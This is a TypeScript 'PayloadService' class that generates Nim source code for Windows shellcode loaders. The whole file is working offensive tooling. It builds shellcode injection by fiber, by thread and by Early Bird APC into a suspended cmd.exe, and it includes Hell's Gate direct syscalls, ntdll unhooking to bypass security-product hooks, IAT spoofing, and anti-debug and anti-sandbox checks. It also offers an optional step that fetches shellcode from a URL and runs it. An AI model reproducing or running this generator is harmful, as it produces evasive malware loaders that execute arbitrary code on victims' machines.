import { PayloadRequest } from '../schemas/payload.schema';

export class PayloadService {

    generateSource(config: PayloadRequest): string {
        const imports = ['winim/lean', 'strutils']; // strutils for parsing if needed
        if (config.shellcode_url) {
            imports.push('puppy');
        }

        if (config.syscall_evasion === 'unhooking_classique') {
            imports.push('ptr_math', 'strformat');
        }

        const directives = [];
        // ASM needed for PEB check, Hell's Gate, or any inline ASM
        if (config.anti_debug.length > 0 || config.syscall_evasion === 'hells_gate') {
            directives.push('{.passC: "-masm=intel".}');
        }
        // IAT Spoofing - link DLLs
        if (config.iat_spoofing.length > 0) {
            const dlls = [...new Set(config.iat_spoofing.map(f => f.dll))];
            const linkFlags = dlls.map(dll => `-l${dll}`).join(' ');
            directives.push(`{.passL: "${linkFlags}".}`);
        }

        const utilsBlock = this.generateUtilsBlock(config);
        const iatSpoofing = config.iat_spoofing.length > 0 ? this.generateIATSpoofing(config.iat_spoofing) : "";
        const hellsGateInfra = config.syscall_evasion === 'hells_gate' ? this.generateHellsGateInfra() : "";
        const unhookingLogic = config.syscall_evasion === 'unhooking_classique' ? this.generateUnhookingClassique() : "";
        const evasionProcs = this.generateEvasionProcs(config);
        const injectionProc = this.generateInjectionProc(config);
        const shellcodeBlock = this.generateShellcodeBlock(config);
        const mainLogic = this.generateMainLogic(config);

        let entryPoint = '';
        if (config.output === 'exe') {
            entryPoint = `
proc main() =
${mainLogic.split('\n').map(line => line.trim() === '' ? '' : '    ' + line).join('\n')}

main()
`;
        } else {
            const exportName = config.export_function_name || 'DllMain';
            if (exportName === 'DllMain') {
                entryPoint = `
proc DllMain*(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    if fdwReason == DLL_PROCESS_ATTACH:
${mainLogic.split('\n').map(line => line.trim() === '' ? '' : '        ' + line).join('\n')}
    return true
`;
            } else {
                entryPoint = `
proc ${exportName}*() {.stdcall, exportc, dynlib.} = 
    NimMain()
${mainLogic.split('\n').map(line => line.trim() === '' ? '' : '    ' + line).join('\n')}

# Optional: Still provide a DllMain for basic initialization if needed
proc DllMain*(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    return true
`;
            }
        }

        return `
import ${imports.join(', ')}

${directives.join('\n')}

${utilsBlock}

${iatSpoofing}

${hellsGateInfra}
${unhookingLogic}

${evasionProcs}

${injectionProc}

${shellcodeBlock}

# Forward declaration for Nim runtime initialization
proc NimMain() {.cdecl, importc.}

${entryPoint}
`;
    }

    private generateUtilsBlock(config: PayloadRequest): string {
        let code = `
func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))
`;
        if (config.xor_key) {
            code += `
proc xorDecodeMulti(data: seq[byte], key: seq[byte]): seq[byte] =
    result = newSeq[byte](data.len)
    let keyLen = key.len
    for i in 0..<data.len:
        result[i] = data[i] xor key[i mod keyLen]
`;
        }

        // Fibonacci needed for timing evasion
        if (config.anti_sandbox.includes('timing')) {
            code += `
proc fibonacci(n: int): string =
  if n == 0: return "0"
  if n == 1: return "1"
  var a = @[0]
  var b = @[1]
  for i in 2..n:
    var carry = 0
    var temp: seq[int] = @[]
    let maxLen = max(a.len, b.len)
    for j in 0..<maxLen:
      let digitA = if j < a.len: a[j] else: 0
      let digitB = if j < b.len: b[j] else: 0
      let sum = digitA + digitB + carry
      temp.add(sum mod 10)
      carry = sum div 10
    if carry > 0: temp.add(carry)
    a = b
    b = temp
  result = ""
  for j in countdown(b.high, 0):
    result.add($b[j])
`;
        }
        return code;
    }

    private generateIATSpoofing(iatFunctions: Array<{ dll: string, function_name: string }>): string {
        if (iatFunctions.length === 0) return "";

        const functionSignatures: Record<string, string> = {
            "GetActiveWindow": "proc GetActiveWindow*(): HWND {.stdcall, importc: \"GetActiveWindow\".}",
            "GetSystemMetrics": "proc GetSystemMetrics*(nIndex: int32): int32 {.stdcall, importc: \"GetSystemMetrics\".}",
            "IsWindowVisible": "proc IsWindowVisible*(hWnd: HWND): WINBOOL {.stdcall, importc: \"IsWindowVisible\".}",
            "MessageBoxW": "proc MessageBoxW*(hWnd: HWND, lpText, lpCaption: ptr uint16, uType: uint32): int32 {.stdcall, importc: \"MessageBoxW\".}",
            "GetTickCount": "proc GetTickCount*(): uint32 {.stdcall, importc: \"GetTickCount\".}",
            "GetTickCount64": "proc GetTickCount64*(): uint64 {.stdcall, importc: \"GetTickCount64\".}",
            "GetFileType": "proc GetFileType*(hFile: HANDLE): uint32 {.stdcall, importc: \"GetFileType\".}",
            "GetCurrentProcessId": "proc GetCurrentProcessId*(): uint32 {.stdcall, importc: \"GetCurrentProcessId\".}",
            "GetCurrentThreadId": "proc GetCurrentThreadId*(): uint32 {.stdcall, importc: \"GetCurrentThreadId\".}",
            "RegCloseKey": "proc RegCloseKey*(hKey: HKEY): int32 {.stdcall, importc: \"RegCloseKey\".}",
            "RegOpenKeyExW": "proc RegOpenKeyExW*(hKey: HKEY, lpSubKey: ptr uint16, ulOptions: uint32, samDesired: REGSAM, phkResult: ptr HKEY): int32 {.stdcall, importc: \"RegOpenKeyExW\".}",
            "RegQueryValueExW": "proc RegQueryValueExW*(hKey: HKEY, lpValueName: ptr uint16, lpReserved: ptr uint32, lpType: ptr uint32, lpData: ptr byte, lpcbData: ptr uint32): int32 {.stdcall, importc: \"RegQueryValueExW\".}",
            "SHGetFolderPathW": "proc SHGetFolderPathW*(hwnd: HWND, csidl: int32, hToken: HANDLE, dwFlags: uint32, pszPath: ptr uint16): HRESULT {.stdcall, importc: \"SHGetFolderPathW\".}",
            "WSAStartup": "proc WSAStartup*(wVersionRequired: uint16, lpWSAData: ptr WSADATA): int32 {.stdcall, importc: \"WSAStartup\".}",
            "WSACleanup": "proc WSACleanup*(): int32 {.stdcall, importc: \"WSACleanup\".}",
            "gethostname": "proc gethostname*(name: cstring, namelen: int32): int32 {.stdcall, importc: \"gethostname\".}",
        };

        const functionCalls: Record<string, string> = {
            "GetActiveWindow": "discard GetActiveWindow()",
            "GetSystemMetrics": "discard GetSystemMetrics(0)",
            "IsWindowVisible": "discard IsWindowVisible(0)",
            "MessageBoxW": "# MessageBoxW not called (blocking)",
            "GetTickCount": "discard GetTickCount()",
            "GetTickCount64": "discard GetTickCount64()",
            "GetFileType": "discard GetFileType(0)",
            "GetCurrentProcessId": "discard GetCurrentProcessId()",
            "GetCurrentThreadId": "discard GetCurrentThreadId()",
            "RegCloseKey": "discard RegCloseKey(0)",
            "RegOpenKeyExW": "discard RegOpenKeyExW(0, nil, 0, 0, nil)",
            "RegQueryValueExW": "discard RegQueryValueExW(0, nil, nil, nil, nil, nil)",
            "SHGetFolderPathW": "discard SHGetFolderPathW(0, 0, 0, 0, nil)",
            "WSAStartup": "discard WSAStartup(0, nil)",
            "WSACleanup": "discard WSACleanup()",
            "gethostname": "discard gethostname(nil, 0)",
        };

        let code = `
# ============================================================================
# IAT Spoofing - Benign Function Declarations
# ============================================================================

`;
        for (const func of iatFunctions) {
            const signature = functionSignatures[func.function_name];
            if (signature) code += signature + "\n";
        }

        code += `
# IAT Spoofing - Function Calls (to populate IAT)
proc populateIAT*() =
`;
        for (const func of iatFunctions) {
            const call = functionCalls[func.function_name];
            if (call) code += `    ${call}\n`;
        }

        code += `
# ============================================================================
`;
        return code;
    }

    private generateEvasionProcs(config: PayloadRequest): string {
        let code = "";

        // --- Anti-Sandbox ---
        if (config.anti_sandbox.includes('cpu_ram')) {
            code += `
proc checkResources(): bool =
    var sysInfo: SYSTEM_INFO
    GetSystemInfo(addr sysInfo)
    if sysInfo.dwNumberOfProcessors < 2:
        return false
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = cast[DWORD](sizeof(memStatus))
    GlobalMemoryStatusEx(addr memStatus)
    if cast[uint64](memStatus.ullTotalPhys) < 2147483648'u64:
        return false
    return true
`;
        }
        if (config.anti_sandbox.includes('timing')) {
            code += `
proc sleepObfuscation(): bool=
    let n = 100000
    let result = fibonacci(n)
    return true
`;
        }
        if (config.anti_sandbox.includes('human_behavior')) {
            code += `
proc checkMouseMovement(): bool =
    var startPos: POINT
    GetCursorPos(addr startPos)
    let startTime = GetTickCount()
    while true:
        var currentPos: POINT
        GetCursorPos(addr currentPos)
        let dist = abs(currentPos.x - startPos.x) + abs(currentPos.y - startPos.y)
        if dist > 50:
            return true
        if (GetTickCount() - startTime) > 20000:
            echo "[-] Sandbox detected: No mouse movement"
            return false
        Sleep(100)
`;
        }

        // --- Anti-Debug ---
        if (config.anti_debug.includes('is_debugger_present')) {
            // ASM check for PEB.BeingDebugged
            code += `
proc pebBeingDebugged(): bool {.asmNoStackFrame.}=
    asm """
    mov rax, gs:[0x60]
    movzx rax, byte ptr [rax+2]
    ret
    """
`;
        }

        return code;
    }

    private generateInjectionProc(config: PayloadRequest): string {
        const useHellsGate = config.syscall_evasion === 'hells_gate';

        if (config.injection_method === 'fiber') {
            return this.generateFiberInjection(useHellsGate);
        } else if (config.injection_method === 'thread') {
            return this.generateThreadInjection(useHellsGate);
        } else if (config.injection_method === 'early_bird') {
            return this.generateEarlyBirdInjection(useHellsGate);
        }
        return "";
    }

    private generateFiberInjection(useHellsGate: boolean): string {
        if (useHellsGate) {
            // Hell's Gate version using NT APIs
            return `
proc injectShellcode(shellcode: seq[byte]) =
    let size = shellcode.len
    
    # Resolve NtAllocateVirtualMemory syscall
    var ntAllocEntry = HG_TABLE_ENTRY(dwHash: djb2_hash("NtAllocateVirtualMemory"))
    if not getSyscall(ntAllocEntry):
        echo "[-] Failed to resolve NtAllocateVirtualMemory"
        quit(1)
    syscall = ntAllocEntry.wSysCall
    
    # Allocate RW memory using NT API
    var baseAddr: PVOID = nil
    var regionSize: SIZE_T = cast[SIZE_T](size)
    let allocStatus = NtAllocateVirtualMemory(
        cast[HANDLE](-1),
        baseAddr,
        0,
        addr regionSize,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if allocStatus != 0:
        echo "[-] NtAllocateVirtualMemory failed: 0x", toHex(allocStatus)
        quit(1)
    
    # Copy shellcode
    copyMem(baseAddr, unsafeAddr shellcode[0], size)
    
    # Resolve NtProtectVirtualMemory syscall
    var ntProtectEntry = HG_TABLE_ENTRY(dwHash: djb2_hash("NtProtectVirtualMemory"))
    if not getSyscall(ntProtectEntry):
        echo "[-] Failed to resolve NtProtectVirtualMemory"
        quit(1)
    syscall = ntProtectEntry.wSysCall
    
    # Change protection to RX using NT API
    var protectAddr: PVOID = baseAddr
    var protectSize: SIZE_T = cast[SIZE_T](size)
    var oldProtect: ULONG
    let protectStatus = NtProtectVirtualMemory(
        cast[HANDLE](-1),
        protectAddr,
        addr protectSize,
        PAGE_EXECUTE_READ,
        addr oldProtect
    )
    
    if protectStatus != 0:
        echo "[-] NtProtectVirtualMemory failed"
        quit(1)
    
    # Convert current thread to fiber
    let mainFiber = ConvertThreadToFiber(nil)
    if mainFiber == nil:
        echo "[-] ConvertThreadToFiber failed"
        quit(1)
    
    # Create fiber pointing to shellcode
    let hFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](baseAddr), nil)
    if hFiber == nil:
        echo "[-] CreateFiber failed"
        discard ConvertFiberToThread()
        quit(1)
    
    echo "[+] Executing shellcode via Fiber (Hell's Gate)..."
    SwitchToFiber(hFiber)
    
    # Cleanup
    DeleteFiber(hFiber)
    discard ConvertFiberToThread()
`;
        } else {
            // Standard version using Win32 APIs
            return `
proc injectShellcode(shellcode: seq[byte]) =
    let size = shellcode.len
    
    # Allocate RW memory
    let memAddr = VirtualAlloc(
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if memAddr == nil:
        echo "[-] VirtualAlloc failed"
        quit(1)
    
    # Copy shellcode to allocated memory
    copyMem(
        memAddr,
        unsafeAddr shellcode[0],
        size
    )
    
    # Change protection to RX
    var oldProtection: DWORD
    let protectSuccess = VirtualProtect(memAddr, SIZE_T(size), PAGE_EXECUTE_READ, addr oldProtection)
    
    if protectSuccess == 0:
        echo "[-] VirtualProtect failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    # Convert current thread to fiber
    let mainFiber = ConvertThreadToFiber(nil)
    if mainFiber == nil:
        echo "[-] ConvertThreadToFiber failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    # Create fiber pointing to shellcode
    let hFiber = CreateFiber(
        0,
        cast[LPFIBER_START_ROUTINE](memAddr),
        nil
    )
    
    if hFiber == nil:
        echo "[-] CreateFiber failed"
        discard ConvertFiberToThread()
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    echo "[+] Executing shellcode via Fiber..."
    SwitchToFiber(hFiber)
    
    # Cleanup
    DeleteFiber(hFiber)
    discard ConvertFiberToThread()
    discard VirtualFree(memAddr, 0, MEM_RELEASE)
`;
        }
    }

    private generateThreadInjection(useHellsGate: boolean): string {
        return `
proc injectShellcode(shellcode: seq[byte]) =
    let size = shellcode.len
    
    # Allocate RW memory
    let memAddr = VirtualAlloc(
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if memAddr == nil:
        echo "[-] VirtualAlloc failed"
        quit(1)
    
    # Copy shellcode to allocated memory
    copyMem(
        memAddr,
        unsafeAddr shellcode[0],
        size
    )
    
    # Change protection to RX
    var oldProtection: DWORD
    let protectSuccess = VirtualProtect(memAddr, SIZE_T(size), PAGE_EXECUTE_READ, addr oldProtection)
    
    if protectSuccess == 0:
        echo "[-] VirtualProtect failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    # Create thread pointing to shellcode
    var threadId: DWORD
    let hThread = CreateThread(
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](memAddr),
        nil,
        0,
        addr threadId
    )
    
    if hThread == 0:
        echo "[-] CreateThread failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    echo "[+] Executing shellcode via Thread..."
    discard WaitForSingleObject(hThread, INFINITE)
    
    # Cleanup
    discard CloseHandle(hThread)
    discard VirtualFree(memAddr, 0, MEM_RELEASE)
`;
    }

    private generateEarlyBirdInjection(useHellsGate: boolean): string {
        return `
proc injectShellcode(shellcode: seq[byte]) =
    var 
        si: STARTUPINFOW
        pi: PROCESS_INFORMATION
    
    si.cb = cast[DWORD](sizeof(si))
    si.dwFlags = STARTF_USESHOWWINDOW
    
    # 1. Create suspended process
    let success = CreateProcessW(
        L"C:\\\\Windows\\\\System32\\\\cmd.exe",
        nil,
        nil,
        nil,
        FALSE,
        CREATE_SUSPENDED,
        nil,
        L"C:\\\\Windows\\\\System32",
        addr si,
        addr pi
    )
    
    if success == 0:
        echo "[-] CreateProcessW failed: ", GetLastError()
        quit(1)
    
    # 2. Allocate memory in remote process
    let hMemory = VirtualAllocEx(
        pi.hProcess,
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if hMemory == nil:
        echo "[-] VirtualAllocEx failed"
        discard CloseHandle(pi.hThread)
        discard CloseHandle(pi.hProcess)
        quit(1)
    
    # 3. Write shellcode to allocated memory
    var bytesWritten: SIZE_T
    let writeSuccess = WriteProcessMemory(
        pi.hProcess,
        hMemory,
        addr shellcode[0],
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    
    if writeSuccess == 0:
        echo "[-] WriteProcessMemory failed"
        discard CloseHandle(pi.hThread)
        discard CloseHandle(pi.hProcess)
        quit(1)
    
    # 4. Queue APC to execute shellcode
    let apcSuccess = QueueUserAPC(
        cast[PAPCFUNC](hMemory),
        pi.hThread,
        0
    )
    
    if apcSuccess == 0:
        echo "[-] QueueUserAPC failed"
        discard CloseHandle(pi.hThread)
        discard CloseHandle(pi.hProcess)
        quit(1)
    
    # 5. Resume thread to execute APC
    echo "[+] Executing shellcode via Early Bird (APC)..."
    discard ResumeThread(pi.hThread)
    
    # Cleanup
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
`;
    }

    private generateHellsGateInfra(): string {
        return `
# ============================================================================
# Hell's Gate - Syscall Evasion Infrastructure
# ============================================================================

var syscall*: WORD

type
    HG_TABLE_ENTRY* = object
        pAddress*: PVOID
        dwHash*: uint64
        wSysCall*: WORD
    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

# DJB2 Hash Function
proc djb2_hash*(pFuncName: string): uint64 =
    var hash: uint64 = 0x5381
    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
    return hash

# Get PEB via inline ASM
proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm """
        mov rax, qword ptr gs:[0x60]
        ret
    """

# Helper: Convert Flink to Module
proc flinkToModule*(pCurrentFlink: LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

# Helper: Get module buffer
proc moduleToBuffer*(pCurrentModule: PLDR_DATA_TABLE_ENTRY): PWSTR =
    return pCurrentModule.FullDllName.Buffer

# Get Export Table from module
proc getExportTable*(pCurrentModule: PLDR_DATA_TABLE_ENTRY, pExportTable: var PIMAGE_EXPORT_DIRECTORY): bool =
    let 
        pImageBase: PVOID = pCurrentModule.DLLBase
        pDosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)
    
    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false
    
    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false
    
    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)
    return true

# Find function in export table and extract syscall number
proc getTableEntry*(pImageBase: PVOID, pCurrentExportDirectory: PIMAGE_EXPORT_DIRECTORY, tableEntry: var HG_TABLE_ENTRY): bool =
    var 
        cx: DWORD = 0
        numFuncs: DWORD = pCurrentExportDirectory.NumberOfNames
    let 
        pAddrOfFunctions: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals: ptr UncheckedArray[WORD] = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)
    
    while cx < numFuncs:    
        var 
            pFuncOrdinal: WORD = pAddrOfOrdinals[cx]
            pFuncName: string = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash: uint64 = djb2_hash(pFuncName)
            funcRVA: DWORD64 = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr: PVOID = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:
            tableEntry.pAddress = pFuncAddr
            # Extract syscall number from function stub (offset +4 after mov r10, rcx)
            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
            return true
        inc cx
    return false

# Get next module in list
proc getNextModule*(flink: var LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

# Search loaded modules for syscall
proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bool =
    var 
        currFlink: LIST_ENTRY = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule: PLDR_DATA_TABLE_ENTRY = flinkToModule(currFlink)                 
        pExportTable: PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:
        if getExportTable(currModule, pExportTable):
            if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
                return true
        
        currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

# Main syscall resolver
proc getSyscall*(tableEntry: var HG_TABLE_ENTRY): bool =
    let currentPeb: PPEB = GetPEBAsm64()
    if not searchLoadedModules(currentPeb, tableEntry):
        return false
    return true

# ============================================================================
# NT API Wrappers (Direct Syscall Invocation)
# ============================================================================

# NtAllocateVirtualMemory - Replaces VirtualAlloc/VirtualAllocEx
proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        movzx eax, word ptr [rip + \`syscall\`]
        syscall
        ret
    """

# NtProtectVirtualMemory - Replaces VirtualProtect
proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        movzx eax, word ptr [rip + \`syscall\`]
        syscall
        ret
    """

# NtWriteVirtualMemory - Replaces WriteProcessMemory
proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        movzx eax, word ptr [rip + \`syscall\`]
        syscall
        ret
    """

# ============================================================================
`;
    }

    private generateMainLogic(config: PayloadRequest): string {
        let code = "";

        // 0. Classic Unhooking - Restore ntdll.dll
        if (config.syscall_evasion === 'unhooking_classique') {
            code += 'if not ntdllunhook(): quit(1)\n';
        }

        // 0. IAT Spoofing - populate IAT with benign functions
        if (config.iat_spoofing.length > 0) {
            code += "populateIAT()\n";
        }

        // 1. Anti-Debug Checks
        if (config.anti_debug.includes('is_debugger_present')) {
            code += "if IsDebuggerPresent(): quit(0)\nif pebBeingDebugged(): quit(0)\n";
        }

        // 2. Anti-Sandbox Checks
        if (config.anti_sandbox.length > 0) {
            code += 'echo "[*] Performing sandbox checks..."\n';
            if (config.anti_sandbox.includes('timing')) {
                code += "if not sleepObfuscation(): quit(0)\n";
            }
            if (config.anti_sandbox.includes('cpu_ram')) {
                code += "if not checkResources(): quit(0)\n";
            }
            if (config.anti_sandbox.includes('human_behavior')) {
                code += "if not checkMouseMovement(): quit(0)\n";
            }
        }

        // 3. Shellcode Retrieval
        if (config.shellcode_url) {
            code += `
let shellcodeStr = extractShellCodeWithHttp()
if shellcodeStr.len == 0: quit(0)
var shellcodeByte: seq[byte] = toByteSeq(shellcodeStr)
`;
        } else {
            code += `
# Convert array to seq for easier handling
var shellcodeByte = @shellcode
`;
        }

        // 4. XOR Decryption
        if (config.xor_key) {
            const keyBytes = config.xor_key.split(',').map(s => s.trim());
            code += `
let xorKeyMulti: seq[byte] = @[${keyBytes.map(k => `${k}'u8`).join(', ')}]
var finalShellcode = xorDecodeMulti(shellcodeByte, xorKeyMulti)
`;
        } else {
            code += "var finalShellcode = shellcodeByte\n";
        }

        // 5. Injection
        code += "injectShellcode(finalShellcode)\n";

        return code;
    }

    private generateShellcodeBlock(config: PayloadRequest): string {
        if (config.shellcode) {
            // Raw shellcode case
            const shellcodeStr = config.shellcode.trim();
            const bytes = shellcodeStr.split(',').filter(s => s.trim().length > 0);
            const size = bytes.length;

            return `var shellcode: array[${size}, byte] = [${shellcodeStr}]`;
        }
        else if (config.shellcode_url) {
            // URL case using puppy
            return `
proc extractShellCodeWithHttp(): string =
    try:
        result = fetch("${config.shellcode_url}")
        return result
    except PuppyError as e:
        echo "Erreur HTTP: ", e.msg
        return ""


# Initialize shellcode on heap for HTTP
let shellcodeStr = extractShellCodeWithHttp()
var shellcode: seq[byte] = toByteSeq(shellcodeStr)
`;
        }

        return ""; // Should be caught by validation
    }

    private generateUnhookingClassique(): string {
        return `
# ============================================================================
# Classic Unhooking Logic
# ============================================================================

proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc ntdllunhook(): bool =
    let low: uint16 = 0
    var
        processH = GetCurrentProcess()
        mi : MODULEINFO
        ntdllModule = GetModuleHandleA("ntdll.dll")
        ntdllBase : LPVOID
        ntdllFile : FileHandle
        ntdllMapping : HANDLE
        ntdllMappingAddress : LPVOID
        hookedDosHeader : PIMAGE_DOS_HEADER
        hookedNtHeader : PIMAGE_NT_HEADERS
        hookedSectionHeader : PIMAGE_SECTION_HEADER

    GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
    ntdllBase = mi.lpBaseOfDll
    ntdllFile = getOsFileHandle(open("C:\\\\windows\\\\system32\\\\ntdll.dll", fmRead))
    ntdllMapping = CreateFileMapping(ntdllFile, NULL, 0x1000002, 0, 0, NULL) # SEC_IMAGE (0x1000000) | PAGE_READONLY (0x02)
    
    if ntdllMapping == 0:
        # echo fmt"Could not create file mapping object ({GetLastError()})."
        return false
    
    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
    if ntdllMappingAddress.isNil:
        # echo fmt"Could not map view of file ({GetLastError()})."
        return false

    hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
    hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)

    for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
        hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        
        if ".text" in toString(hookedSectionHeader.Name):
            var oldProtection : DWORD = 0
            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0: # 0x40 = PAGE_EXECUTE_READWRITE
                # echo fmt"Failed calling VirtualProtect ({GetLastError()})."
                return false
            
            copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
            
            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
                # echo fmt"Failed resetting memory back to its original protections ({GetLastError()})."
                return false

    CloseHandle(processH)
    CloseHandle(ntdllFile)
    CloseHandle(ntdllMapping)
    # FreeLibrary(ntdllModule) # We don't want to free ntdll
    return true

# ============================================================================
`;
    }
}
